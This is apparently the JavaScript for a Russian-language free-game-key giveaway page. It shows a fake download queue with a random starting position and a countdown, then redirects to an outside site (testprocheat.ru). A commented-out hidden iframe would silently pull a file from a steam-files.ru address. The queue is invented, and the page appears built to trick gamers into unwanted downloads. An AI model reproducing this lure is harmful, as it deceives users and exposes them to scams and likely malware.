$(document).ready(function(){
	$.arcticmodal('setDefault', {
		beforeOpen: function(data, el) {
			$('.bg, .header-panel').hide();
		},
		afterClose: function(data, el) {
			$('.bg, .header-panel').fadeIn(300);
		}
	});
	
	$('.tabs-nav').on('click', 'li:not(.active)', function() {
		$(this).addClass('active').siblings().removeClass('active').closest('.tabs').find('.tabs-content').removeClass('active').eq($(this).index()).addClass('active');
	});
});

function getRandomInt(min, max)
{
  return Math.floor(Math.random() * (max - min + 1)) + min;
}		
		
function games(id)
{
var gm = ["PlayerUnknown's Battlegrounds", "Counter Strike:Global Offensive", "Grand Theft Auto V", "Prey", "Hitman Absolution: Elite Edition", "LEGO City Undercover", "Euro Truck Simulator 2"];
var your_place = getRandomInt(3, 47);
document.getElementById("select_game").innerHTML = "<p style='font-size:30px; color:#fd2457; text-align: center;'>Получение " + gm[id] + "</p>";
document.getElementById("place").innerHTML = "<h2>ВЫ " + your_place + " В ОЧЕРЕДИ. ОЖИДАЙТЕ</h2><br><br><br><h5>КАК ТОЛЬКО ПОДОЙДЁТ ВАША ОЧЕРЕДЬ, НАЧНЕТСЯ СКАЧИВАНИЕ ФАЙЛА С ВАШИМ КЛЮЧЁМ.</h3>";


var timerId = setInterval(function() {
  if(your_place <= 1)
  {
	clearInterval(timerId);
	document.getElementById("place").innerHTML = "<h2>СКАЧИВАНИЕ КЛЮЧА С ИГРОЙ НАЧАЛОСЬ....</h2><br><br><br><h5>ЕСЛИ ЭТО НЕ ПРОИЗОШЛО, ТО <a href='/download/'>СКАЧАЙТЕ ВРУЧНУЮ (НАЖАВ СЮДА)</a></h3>";
	//document.getElementById("download").innerHTML = "<iframe src='http://s4.steam-files.ru/download/index.php?gabe-download=1' style='display: none;'>";
	window.location.href = "http://testprocheat.ru/gg-keys/"; // test
  }
  else 
  {
	your_place--;
	document.getElementById("place").innerHTML = "<h2>ВЫ " + your_place + " В ОЧЕРЕДИ. ОЖИДАЙТЕ</h2><br><br><br><h5>КАК ТОЛЬКО ПОДОЙДЁТ ВАША ОЧЕРЕДЬ, НАЧНЕТСЯ СКАЧИВАНИЕ ФАЙЛА С ВАШИМ КЛЮЧЁМ.</h3>";
  }
}, 1470);
}